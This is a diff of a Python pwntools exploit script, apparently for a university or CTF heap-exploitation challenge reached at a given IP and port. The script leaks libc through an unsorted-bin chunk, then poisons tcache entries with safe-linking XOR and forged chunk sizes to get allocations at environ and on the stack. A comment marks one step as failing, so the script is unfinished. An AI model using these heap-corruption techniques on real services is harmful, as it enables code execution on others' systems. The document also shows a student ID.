@@ -22,8 +22,8 @@ def make_commands(args: List[str]) -> List[str]:
     return flatten(map(lambda a: [a], args))
 
 breakpoints = [
-    '&main+118', # main RET
-    '&menu+125', # menu RET 
+    # '&main+118', # main RET
+    # '&menu+125', # menu RET 
 ]
 print_statements = []
 breakpoints = make_breakpoints(breakpoints)
@@ -39,12 +39,12 @@ continue
 
 # GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
 
-with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
-    p: process
-    p.gdb: Gdb
+# with gdb.debug(binary, gdbscript=gdbscript) as p:
+#     p: process
+#     p.gdb: Gdb
 
-# with remote('128.238.62.254',12348) as p:
-
+# with process(binary) as p:
+with remote('128.238.62.254', 12348) as p:
 
     is_remote = isinstance(p, remote)
     is_debuggable = not is_remote
@@ -54,12 +54,12 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
             cmd = cmd.encode()
         elif type(cmd) == int:
             cmd = str(cmd).encode()
-
-        p.sendlineafter(b'>', cmd)
+        p.sendafter(b'>', cmd)
 
     def add(size: int):
         send_cmd(1)
-        p.sendlineafter(b'Size:\n', str(size).encode())
+        p.recvuntil(b'Size:\n')
+        p.send(str(size).encode())
 
     def delete(idx: int):
         send_cmd(2)
@@ -68,32 +68,25 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     def edit(idx: int, cmd: bytes):
         send_cmd(3)
         send_cmd(idx)
-        p.sendlineafter(b'Size:\n', str(len(cmd) + 1).encode())
-        p.sendlineafter(b'Content:\n', cmd)
+        p.recvuntil(b'Size:\n')
+        p.send(str(len(cmd)).encode())
+        p.recvuntil(b'Content:\n')
+        p.send(cmd)
 
     def show(idx: int) -> bytes:
         send_cmd(4)
         send_cmd(idx)
         p.recvuntil(b'Content:\n').decode()
         data = p.recvuntil(b'===').rstrip(b'===')
-        log.info("Heap at idx %d: %s", idx, data)
+        # log.info("Heap at idx %d: %s", idx, data)
         return data
 
     def exit():
         send_cmd(5)
 
-    def wait():
-        if is_debuggable:
-            p.gdb.wait()
-
     if is_remote:
         p.recvuntil(b'Please input your NetID (something like abc123): ')
         p.sendline(b'nf2137')
-
-    '''
-    x/50xg 0x555555559290
-    x/32xg &array
-    '''
 
     SIZE = 0x20
     UNSORTED_BIN_SIZE = 0x418
@@ -106,10 +99,9 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     delete(0)
     add(UNSORTED_BIN_SIZE) # 0
 
-
     main_arena = u64(show(0)[:8])
     libc_base: int = main_arena - 0x219ce0 # From main arena to libc.so.6 vmmap first entry
-    environ: int = main_arena + 0x505f0 # From main arena to p &environ
+    environ: int = libc_base + 0x221200 # From main arena to p &environ
 
     libc.address = libc_base
     elf.libc.address = libc_base
@@ -145,13 +137,14 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     log.info(f'fw &environ: {hex(fw)}')
 
     # Point to &environ
-    edit(2, b'A' * (SIZE + 8) + p64(SIZE + 1) + p64(fw))
+    edit(2, b'A' * (SIZE + 8) + p64(0x31) + p64(fw))
 
     '''
     Get environ stack
     '''
     add(SIZE) # 3
-    add(SIZE) # 4 environ
+    add(SIZE) # 4 environ <-- FAILS HERE
+
     environ_stack = u64(show(4)[:8])
     log.info(f'environ_stack: {hex(environ_stack)}')
 
@@ -168,29 +161,14 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     add(BIGGER_SIZE) # 5
 
 
-    # pwndbg> x/xg &array
-    # 0x564e86426060 <array>: 0x0000564e883292a0
-    # pwndbg> x/xg 0x564e86426060 + (8 * 9) # Index we want
-    # 0x564e864260a8 <array+72>:      0x0000564e883293c0
-    # pwndbg> p/x 0x0000564e883293c0 - 0x564e88329000 # Array address - Heap Base
-    # $1 = 0x3c0
     curr = heap_base + 0x7b0
-
-    # WHEN IN MAIN:
-    # pwndbg> p environ
-    # $1 = (char **) 0x7ffdc0041708
-    # pwndbg> x/2xg $rbp
-    # 0x7ffdc00415e0: 0x0000000000000001      0x00007fa717f2ed90
-    # pwndbg> p/x 0x7ffdc0041708 - (0x7ffdc00415e0)
-    # $2 = 0x128
     offset_to_rbp_address = 0x128
-
 
     fw = (curr >> 12) ^ (environ_stack - offset_to_rbp_address)
     log.info(f'array mem offset (idx 5) for environ {hex(curr)}')
     log.info(f'fw stack: {hex(fw)}')
 
-    edit(5, b'A' * (BIGGER_SIZE + 8) + p64(BIGGER_SIZE + 1) + p64(fw))
+    edit(5, b'A' * (BIGGER_SIZE + 8) + p64(0x81) + p64(fw))
     add(BIGGER_SIZE) # 6
     add(BIGGER_SIZE) # 7 --> stack
 
